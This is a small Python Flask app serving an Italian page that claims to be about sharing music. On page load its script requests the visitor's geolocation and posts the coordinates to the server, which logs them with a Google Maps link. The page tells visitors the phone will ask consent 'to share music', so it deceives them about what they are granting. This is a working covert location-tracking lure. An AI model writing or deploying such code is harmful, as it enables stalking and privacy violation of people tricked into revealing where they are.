
from flask import Flask, request, jsonify
import os

app = Flask(__name__)

@app.route("/")
def home():
    return """
    <h1>Condivisione musica</h1>
    <p>Aprendo questa pagina, il telefono chiederà il consenso per condividere la musica.</p>

    <button onclick="mandaMusica()">📍 Invia posizione</button>

    <script>
    function mandaMusica() {
      navigator.geolocation.getCurrentPosition(function(pos) {
        fetch("/save", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude
          })
        }).then(() => {
          document.body.innerHTML = "Posizione inviata correttamente.";
        });
      }, function(error) {
        document.body.innerHTML = "Posizione non inviata: " + error.message;
      });
    }

    window.onload = function() {
      mandaMusica();
    };
    </script>
    """

@app.route("/save", methods=["POST"])
def save():
    data = request.json
    print("📍 POSIZIONE:", data)
    print("🌍 Google Maps: https://www.google.com/maps?q={},{}".format(data["lat"], data["lon"]))
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 52194))
    app.run(host="0.0.0.0", port=port)
